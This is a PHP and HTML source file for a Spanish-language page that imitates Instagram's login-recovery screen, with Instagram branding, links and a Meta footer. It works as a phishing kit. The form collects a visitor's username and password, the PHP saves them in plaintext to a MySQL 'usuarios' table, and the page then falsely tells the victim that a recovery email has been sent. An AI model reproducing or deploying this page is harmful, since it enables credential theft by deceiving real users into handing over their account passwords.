<?php


/* When the form is submitted, the program collects the input data (username and password), initiates a connection 
 * to a MySQL database, and inserts the user's data into a 'usuarios' table. If the database query is successful, 
 * a session message is set to inform the user that an email has been sent to them. If the query fails, an error 
 * message is stored in the session. After processing, the page reloads to display the result. 
*/

session_start(); // Iniciar la sesión al principio del archivo

// Verificar si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $usuario = $_POST["usuario"];
    $contrasena = $_POST["contrasena"];

    // Conectar a la base de datos
    $conexion = new mysqli("your_ip", "username", "your_password", "database_name");

    // Verificar la conexión
    if ($conexion->connect_error) {
        die("Error de conexión: " . $conexion->connect_error);
    }

    // Preparar la consulta SQL
    $consulta = $conexion->prepare("INSERT INTO usuarios (usuario, contrasena) VALUES (?, ?)");

    // Vincular los parámetros
    $consulta->bind_param("ss", $usuario, $contrasena);

    // Ejecutar la consulta
    if ($consulta->execute()) {
      $_SESSION['mensaje'] = "Le hemos enviado la solicitud, revise su correo electrónico.";
    } else {
      $_SESSION['mensaje'] = "Error al ejecutar la consulta: " . $consulta->error;
    }

    // Cerrar la consulta y la conexión
    $consulta->close();
    $conexion->close();

    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
?>

<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="registro.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
  </head>

  <body>
 
    <div class="cabeza"><a href="https://www.instagram.com/"><img src="logoLetra.png" alt="" class="logoCabeza"></a></div>
    <div class="container">
      <div class="center">
        <div class="header">
          <img src="candado.png" alt="instagramLogo" class="instaLogo" />
        </div>
        <div class="problemas">
            <h4>¿Tienes problemas para iniciar sesión?
            </h4>
        </div>
        <div class="ingresa">Ingresa tu correo electrónico, teléfono o nombre de usuario y contraseña y te enviaremos un enlace para que recuperes el acceso a tu cuenta.


        </div>
        <div class="inputElement">
       
            <form method="post" action="">
              <input type="text" placeholder="Número, usuario o correo electrónico" class="inputText" name="usuario"/>
              <input type="password" placeholder="Contraseña" class="inputText" name="contrasena" />
              <input type="submit" value="Iniciar Sesión" class="inputButton" />
            </form>
            <?php
            if (isset($_SESSION['mensaje'])) {
                echo "<p>{$_SESSION['mensaje']}</p>";
                unset($_SESSION['mensaje']); // Limpiar la variable de sesión después de mostrar el mensaje
            }
            ?>
          <div class="line">
            <span class="arrow"></span>
            <span class="content">O</span>
            <span class="arrow"></span>
          </div>
          <div class="cuenta">
           <a href="https://www.instagram.com/accounts/emailsignup/" class="crear"><span>Crear nueva cuenta</span></a> 
          </div>
          <div class="forgetPassword"><a href="https://help.instagram.com/contact/505535973176353" class="olvidaste">¿Olvidaste la contraseña?</a></div>
        </div>
        <div class="footer">
          <a href="https://www.instagram.com/accounts/login/?source=auth_switcher" class="volver">Volver al Inicio de Sesión</a>
           
        </div>
      </div>
    </div>
 
    <footer>
      <div class="final"><a href="https://l.instagram.com/?u=https%3A%2F%2Fabout.meta.com%2F&e=AT3OrSk5KE8OWlvrNyuT_BRh4UrApTpif3LghMZhvdgSVBWPa8jya96RF8-ddTpER14p4fGN_5Fy4XjP4b_4EewUe10cdBNg&s=1">Meta</a> <a href="https://l.instagram.com/?u=https%3A%2F%2Fabout.instagram.com%2F&e=AT15wBXpMQ7Z4IDOIRTBgplmKrYSlOdQ7cPhS-2ieAdHn-N_jBj3iuy_DCmkmXmRs8Sv5yZq4dcg75PeCTQFKZ5DLfufn2gi&s=1">Información</a> <a href="https://about.instagram.com/about-us/careers">Blog</a> <a href="https://help.instagram.com/">Ayuda</a> <a href="https://help.instagram.com/">API</a> <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacidad</a> <a href="https://help.instagram.com/581066165581870/">Condiciones</a> <a href="https://www.facebook.com/help/instagram/261704639352628?next=%2Fjuannbelinchon%2F">Cuentas destacadas</a> <a href="https://www.instagram.com/explore/locations/?next=%2Fjuannbelinchon%2F">Ubicaciones</a> <a href="https://www.instagram.com/web/lite/?next=%2Fjuannbelinchon%2F">Instagram Lite</a></div>
      <div class="copy">© 2024 Instagram from Meta</div>
    </footer>
  </body>
  
</html>
